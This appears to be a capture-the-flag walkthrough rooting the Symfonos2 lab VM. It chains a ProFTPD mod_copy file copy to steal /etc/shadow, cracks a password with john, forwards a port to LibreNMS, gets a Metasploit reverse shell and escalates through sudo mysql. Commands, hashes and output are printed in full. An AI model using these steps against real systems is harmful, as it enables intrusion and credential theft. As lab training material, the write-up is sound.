# Symphonos2 writeup

Let's start with a network scan 
```bash
 Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.113   00:0c:29:c1:ea:17      1      60  VMware, Inc.                                                                                                                                                   
 192.168.0.1     f0:a7:31:e9:bb:f8      1      60  TP-Link Systems Inc
```
\
Next , finding Open Ports
```bash
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
\
When we try to access the ftp service , we can see the version and the service in the banner
```bash
 ftp 192.168.0.113
Connected to 192.168.0.113.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.0.113]
Name (192.168.0.113:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
\
And also anonymous logins required an email (which we do not know) , So i next try to find any vuln related to this specific version of ProFTPD
```bash
earchsploit ProFTPD 1.3.5                 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                        | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                              | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                          | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                        | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
\
So we can see that there are multiple poc for remote code exec , so lets check them 
```bash
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:

---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------

He provides another, scarier example:

------------------------------
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto <?php phpinfo(); ?>
550 cpto: Permission denied
site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
site cpto /var/www/test.php

test.php now contains
----------------------
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): FTP session opened.
2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
phpinfo(); ?>' for copying: Permission denied
-----------------------

test.php contains contain correct php script "<?php phpinfo(); ?>" which
can be run by the php interpreter

Source: http://bugs.proftpd.org/show_bug.cgi?id=4169
```
\
So from this poc , we can see that we can use some specific commands like cpfr and cpto without authentication , so let's try it 
\
For this lets use netcat to connect to ftp service instead of ftp
```bash
nc 192.168.0.113 21 -vvv
192.168.0.113: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.113] 21 (ftp) open
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.0.113]

```
\
When we run site help
```bash
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@symfonos2
```
\
So before we proceed , we see that , there is also an smb service running
```bash
smbmap -H 192.168.0.113            

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                         
[+] IP: 192.168.0.113:445       Name: 192.168.0.113             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)
[*] Closed 1 connections                                                                                                     
```
\
So accessing using anonymous login 
```bash
 smbclient //192.168.0.113/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 10:30:09 2019
  ..                                  D        0  Sat Jan 24 04:16:21 2026
  backups                             D        0  Thu Jul 18 10:25:17 2019

                19728000 blocks of size 1024. 16313208 blocks available
smb: \> cd backups\
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 10:25:17 2019
  ..                                  D        0  Thu Jul 18 10:30:09 2019
  log.txt                             N    11394  Thu Jul 18 10:25:16 2019

                19728000 blocks of size 1024. 16313208 blocks available
```
\
We have a log file , which shows configuration files of ProFTPD and samba and also a backup of /etc/shadow
```bash
head log.txt                                                                
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
```
\
the config for samba is 

```bash
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```
\
And for ftp is 
```bash
# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            aeolus
Group                           aeolus

```
\
And then understanding the poc for ProFTPD , we copy the shadow file to the folder accessible by anonymous login of samba
```bash
nc 192.168.0.113 21 -vvv
192.168.0.113: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.113] 21 (ftp) open
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.0.113]
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.txt
250 Copy successful
```
```bash
smbclient //192.168.0.113/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 24 04:27:38 2026
  ..                                  D        0  Sat Jan 24 04:16:21 2026
  shadow.txt                          N     1173  Sat Jan 24 04:27:38 2026
  backups                             D        0  Thu Jul 18 10:25:17 2019
```
\
We download the shadow file and read it 
```bash
cat shadow.txt 
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::
```
\
We have 3 users with shell : aeolus, cornus, root 
\
So i put the 3 hashes and try to crack with john the ripper
```bash
john -w:/usr/share/wordlists/rockyou.txt user-hashes
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sergioteamo      (?)     
1g 0:00:00:51 0.45% (ETA: 07:39:19) 0.01930g/s 1492p/s 3469c/s 3469C/s 112199..012103
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
\
So i get a password , but i dont know which user it belongs to , so i try to ssh with all 3 and it works with aeolus
```bash
ssh aeolus@192.168.0.113
aeolus@192.168.0.113's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$ 
```
\
Then i try to find ways to priv esc , but no useful SUID found and i tried enumerating file system , but nothing much 
\
Then i try to check ports being used
```bash
aeolus@symfonos2:~$ netstat -tuln
-bash: netstat: command not found
aeolus@symfonos2:~$ netsh
-bash: netsh: command not found
aeolus@symfonos2:~$ ss -tuln
Netid State      Recv-Q Send-Q                                                        Local Address:Port                                                                       Peer Address:Port              
udp   UNCONN     0      0                                                                         *:68                                                                                    *:*                  
udp   UNCONN     0      0                                                                         *:68                                                                                    *:*                  
udp   UNCONN     0      0                                                             192.168.0.255:137                                                                                   *:*                  
udp   UNCONN     0      0                                                             192.168.0.113:137                                                                                   *:*                  
udp   UNCONN     0      0                                                                         *:137                                                                                   *:*                  
udp   UNCONN     0      0                                                             192.168.0.255:138                                                                                   *:*                  
udp   UNCONN     0      0                                                             192.168.0.113:138                                                                                   *:*                  
udp   UNCONN     0      0                                                                         *:138                                                                                   *:*                  
udp   UNCONN     0      0                                                                         *:161                                                                                   *:*                  
tcp   LISTEN     0      80                                                                127.0.0.1:3306                                                                                  *:*                  
tcp   LISTEN     0      50                                                                        *:139                                                                                   *:*                  
tcp   LISTEN     0      128                                                               127.0.0.1:8080                                                                                  *:*                  
tcp   LISTEN     0      32                                                                        *:21                                                                                    *:*                  
tcp   LISTEN     0      128                                                                       *:22                                                                                    *:*                  
tcp   LISTEN     0      20                                                                127.0.0.1:25                                                                                    *:*                  
tcp   LISTEN     0      50                                                                        *:445                                                                                   *:*                  
tcp   LISTEN     0      50                                                                       :::139                                                                                  :::*                  
tcp   LISTEN     0      64                                                                       :::80                                                                                   :::*                  
tcp   LISTEN     0      128                                                                      :::22                                                                                   :::*                  
tcp   LISTEN     0      20                                                                      ::1:25                                                                                   :::*                  
tcp   LISTEN     0      50                                                                       :::445                                                                                  :::*                  
aeolus@symfonos2:~$ 

```
\
We see that port 8080 is found, which was not discovered initially in our scan (since it is accessible only from local shell)
```bash
curl 127.0.0.1:8080
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://127.0.0.1:8080/login" />

        <title>Redirecting to http://127.0.0.1:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:8080/login">http://127.0.0.1:8080/login</a>.
    </body>
```
\
Curl shows that it is a http service , so we try to port forward using ssh to access it on our machine
```bash
ssh -L 9999:127.0.0.1:8080 aeolus@192.168.0.113
ssh -L <local_port>:<target_ip>:<target_port> user@vulnerable_host
```
\
So , when we open browser on port 9999 , we see that there is a LibreNMS http service running
\
<img width="1385" height="672" alt="image" src="https://github.com/user-attachments/assets/677d6c48-82db-4862-b747-0593e7bbe72e" />
\
I open metasploit and check for exploits 
```bash
search LibreNMS

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_authenticated_rce_cve_2024_51092  2024-11-15       excellent  Yes    LibreNMS Authenticated RCE (CVE-2024-51092)
   1  exploit/linux/http/librenms_collectd_cmd_inject               2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection
   2  exploit/linux/http/librenms_addhost_cmd_inject                2018-12-16       excellent  No     LibreNMS addhost Command Injection

```
\
I use the 2nd one addhost 
```bash
msf exploit(linux/http/librenms_addhost_cmd_inject) > show options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME                    yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux



View the full module info with the info, or info -d command.

msf exploit(linux/http/librenms_addhost_cmd_inject) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf exploit(linux/http/librenms_addhost_cmd_inject) > set rport 9999
rport => 9999
msf exploit(linux/http/librenms_addhost_cmd_inject) > set username aeolus
username => aeolus
msf exploit(linux/http/librenms_addhost_cmd_inject) > set password sergioteamo
password => sergioteamo
msf exploit(linux/http/librenms_addhost_cmd_inject) > set lhost 192.168.0.105
lhost => 192.168.0.105
```
\
And after running , we get a shell
```bash
msf exploit(linux/http/librenms_addhost_cmd_inject) > run
[*] Started reverse TCP double handler on 192.168.0.105:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname SvPsbDm
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname SvPsbDm and id #2
[*] Command: echo 3uOD6DsFkxb4pAGU;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "3uOD6DsFkxb4pAGU\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.0.105:4444 -> 192.168.0.113:51718) at 2026-01-24 04:51:34 -0500

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
id
id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
cronus@symfonos2:/opt/librenms/html$ echo $0
echo $0
/bin/bash

```
\
WE get a shell as cronus , and when we checked sudo permissions , mysql was allowed to run as root
```bash
cronus@symfonos2:/home/cronus$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
\
So after checking gtfobins for an exploit , we become root
```bash
cronus@symfonos2:/home/cronus$ sudo -u root mysql -e '\! /bin/sh'
sudo -u root mysql -e '\! /bin/sh'
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
\
We make it a stable shell and get proof
```bash
# python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
root@symfonos2:/home/cronus# cd /root
cd /root
root@symfonos2:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Jul 18  2019 .
drwxr-xr-x 22 root root 4096 Jul 18  2019 ..
lrwxrwxrwx  1 root root    9 Jul 18  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Jul 18  2019 .config
drwxr-xr-x  3 root root 4096 Jul 18  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1444 Jul 18  2019 proof.txt
root@symfonos2:~# cat pro
cat proof.txt 

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

        Contact me via Twitter @zayotic to give feedback!

```
\
The End , Thank you for reading till here
